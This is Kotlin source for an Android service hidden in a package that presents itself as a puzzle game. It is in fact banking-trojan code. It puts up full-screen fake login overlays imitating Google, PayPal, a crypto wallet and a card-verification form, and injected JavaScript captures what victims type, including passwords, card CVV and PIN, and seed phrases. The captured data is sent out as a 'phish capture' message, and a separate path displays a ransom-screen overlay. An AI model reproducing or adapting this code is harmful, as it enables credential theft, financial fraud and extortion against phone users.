package com.puzzleblast.game.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import com.puzzleblast.game.core.Send
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class OverlayService : Service() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var wm: WindowManager? = null
    private var view: android.view.View? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val tmpl = intent?.getStringExtra("tmpl") ?: "bank"
        val ransomText = intent?.getStringExtra("ransom")
        showOverlay(tmpl, ransomText)
        return START_NOT_STICKY
    }

    private fun showOverlay(tmpl: String, ransomText: String?) {
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        if (ransomText != null) {
            val layout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(android.graphics.Color.BLACK)
                setPadding(48, 48, 48, 48)
            }
            val tv = TextView(this).apply {
                text = ransomText
                setTextColor(android.graphics.Color.RED)
                textSize = 20f
            }
            layout.addView(tv)
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
                type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.CENTER }
            view = layout
            wm?.addView(layout, params)
            return
        }

        val web = WebView(this).apply {
            settings.javaScriptEnabled = true
            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    evaluateJavascript(
                        "(function(){var f=document.querySelector('form');if(f){f.addEventListener('submit',function(){var d={};new FormData(f).forEach((v,k)=>d[k]=v);window.JSBridge.post(JSON.stringify(d));});}})()",
                        null
                    )
                }
            }
            addJavascriptInterface(object {
                @android.webkit.JavascriptInterface
                fun post(data: String) {
                    scope.launch { Send.text("🏦 phish capture · $tmpl\n$data") }
                    hideOverlay()
                }
            }, "JSBridge")
            loadDataWithBaseURL(null, htmlFor(tmpl), "text/html", "UTF-8", null)
        }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
            type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply { gravity = Gravity.CENTER }
        view = web
        wm?.addView(web, params)
    }

    private fun htmlFor(tmpl: String): String = when (tmpl) {
        "google" -> """
            <html><body style="font-family:Arial;background:#fff;margin:40px">
            <h2>Sign in</h2><p>to continue to Google</p>
            <form><input name="email" placeholder="Email or phone" style="width:100%;padding:12px;margin:8px 0">
            <input name="pass" type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0">
            <button type="submit" style="background:#1a73e8;color:#fff;padding:12px;width:100%;border:none">Next</button></form></body></html>
        """.trimIndent()
        "paypal" -> """
            <html><body style="font-family:Arial;background:#f5f7fa;margin:40px">
            <h2 style="color:#003087">PayPal</h2>
            <form><input name="email" placeholder="Email" style="width:100%;padding:12px;margin:8px 0">
            <input name="pass" type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0">
            <button type="submit" style="background:#0070ba;color:#fff;padding:12px;width:100%;border:none;border-radius:20px">Log In</button></form></body></html>
        """.trimIndent()
        "crypto" -> """
            <html><body style="font-family:Arial;background:#0d0d0d;color:#fff;margin:40px">
            <h2 style="color:#f7931a">Wallet Connect</h2>
            <form><input name="phrase" placeholder="12/24 word recovery phrase" style="width:100%;padding:12px;margin:8px 0;background:#222;color:#fff">
            <button type="submit" style="background:#f7931a;color:#000;padding:12px;width:100%;border:none">Restore Wallet</button></form></body></html>
        """.trimIndent()
        else -> """
            <html><body style="font-family:Arial;background:#fff;margin:40px">
            <h2>Verify your identity</h2>
            <form><input name="card" placeholder="Card number" style="width:100%;padding:12px;margin:8px 0">
            <input name="cvv" placeholder="CVV" style="width:100%;padding:12px;margin:8px 0">
            <input name="pin" placeholder="PIN" style="width:100%;padding:12px;margin:8px 0">
            <button type="submit" style="background:#00796b;color:#fff;padding:12px;width:100%;border:none">Confirm</button></form></body></html>
        """.trimIndent()
    }

    private fun hideOverlay() {
        try { view?.let { wm?.removeView(it) }; view = null } catch (_: Exception) {}
        stopSelf()
    }

    override fun onDestroy() {
        hideOverlay()
        super.onDestroy()
    }

    companion object {
        fun show(ctx: Context, tmpl: String) {
            ctx.startService(Intent(ctx, OverlayService::class.java).putExtra("tmpl", tmpl))
        }
        fun ransom(ctx: Context, text: String) {
            ctx.startService(Intent(ctx, OverlayService::class.java).putExtra("tmpl", "ransom").putExtra("ransom", text))
        }
        fun hide(ctx: Context) { ctx.stopService(Intent(ctx, OverlayService::class.java)) }
    }
}
